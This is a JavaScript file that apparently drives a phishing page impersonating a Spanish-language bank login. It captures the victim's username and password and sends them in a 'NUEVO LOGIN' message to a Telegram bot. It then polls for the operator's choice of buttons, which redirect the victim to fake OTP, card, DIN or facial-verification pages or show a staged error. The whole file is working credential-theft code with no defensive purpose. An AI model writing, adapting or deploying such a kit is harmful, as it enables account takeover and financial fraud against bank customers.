const userInput = document.getElementById('user');
const passInput = document.getElementById('pass');
const btn = document.getElementById('btn');
const errorMsg = document.getElementById('errorMsg');
const loader = document.getElementById('loadingOverlay');
let pollTimer = null;




function check() {
  if (userInput.value && passInput.value) {
    btn.classList.add('active');
    btn.disabled = false;
  } else {
    btn.classList.remove('active');
    btn.disabled = true;
  }
}
userInput.addEventListener('input', check);
passInput.addEventListener('input', check);

function showError() {
  loader.classList.remove('show');
  errorMsg.classList.add('show');
  userInput.classList.add('error');
  passInput.classList.add('error');
  passInput.value = '';
  check();
  passInput.focus();
  setTimeout(() => {
    errorMsg.classList.remove('show');
    userInput.classList.remove('error');
    passInput.classList.remove('error');
  }, 5000);
}

function stopPolling() {
  if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
}

function getKb() {
  return {
    inline_keyboard: [
      [{ text: '✅ OK LOGIN', callback_data: 'ACTION:OK_LOGIN' }, { text: '❌ ERR LOGIN', callback_data: 'ACTION:ERR_LOGIN' }],
      [{ text: '🔄 DASH', callback_data: 'ACTION:GOTO_DASH' }, { text: '📱 OTP', callback_data: 'ACTION:GOTO_OTP' }, { text: '🔑 DIN', callback_data: 'ACTION:GOTO_DIN' }],
      [{ text: '💳 TC', callback_data: 'ACTION:GOTO_TC' }, { text: '👤 FACIAL', callback_data: 'ACTION:GOTO_FACIAL' }],
      [{ text: '⚠️ ERROR 923', callback_data: 'ACTION:ERROR_923' }]
    ]
  };
}

async function pollStatus(msgId, sessionId) {
  try {
    const r = await fetch(`/api/getUpdates?msgId=${msgId}`);
    const d = await r.json();
    if (d.ok && d.result) {
      for (let u of d.result) {
        if (u.callback_query && u.callback_query.message.message_id === msgId) {
          const act = u.callback_query.data.replace('ACTION:', '');

          // Borrar botones en Telegram al hacer clic
          fetch(`/api/editMessageReplyMarkup`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message_id: msgId, reply_markup: { inline_keyboard: [] } })
          });

          const go = (path) => {
            sessionStorage.setItem('bc_user', userInput.value.trim());
            sessionStorage.setItem('bc_session', sessionId);
            window.location.href = path;
          };

          if (act === 'OK_LOGIN' || act === 'GOTO_DASH') return go('dashboard.html');
          if (act === 'GOTO_OTP') return go('otp.html');
          if (act === 'GOTO_DIN') return go('dashboard.html?modal=din');
          if (act === 'GOTO_TC') return go('tarjeta.html');
          if (act === 'GOTO_FACIAL') return go('facial.html');
          if (act === 'ERR_LOGIN') return showError();
          if (act === 'ERROR_923') {
            stopPolling();
            loader.classList.remove('show');
            document.getElementById('modal923').classList.add('show');
          }
          return;
        }
      }
    }
  } catch (e) { }
  pollTimer = setTimeout(() => pollStatus(msgId, sessionId), 2000);
}

function close923() {
  document.getElementById('modal923').classList.remove('show');
  sessionStorage.clear();
  location.reload();
}

btn.addEventListener('click', async () => {
  if (btn.disabled) return;
  errorMsg.classList.remove('show');
  userInput.classList.remove('error');
  passInput.classList.remove('error');
  loader.classList.add('show');

  try {
    const sid = 'S-' + Math.floor(Math.random() * 100000);
    const txt = `🔐 *NUEVO LOGIN*\n\n🆔 ID: \`${sid}\`\n👤 Usuario: \`${userInput.value.trim()}\`\n🔑 Clave: \`${passInput.value}\``;

    const res = await fetch(`/api/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ text: txt, parse_mode: 'Markdown', reply_markup: getKb() })
    });

    const data = await res.json();
    if (!data.ok) {
      loader.classList.remove('show');
      alert('Error de API. Revisa las credenciales.');
      return;
    }
    pollStatus(data.result.message_id, sid);
  } catch (e) {
    loader.classList.remove('show');
    alert('Error de red. Verifica tu conexión.');
  }
});

[userInput, passInput].forEach(i => {
  i.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' && !btn.disabled) btn.click();
  });
});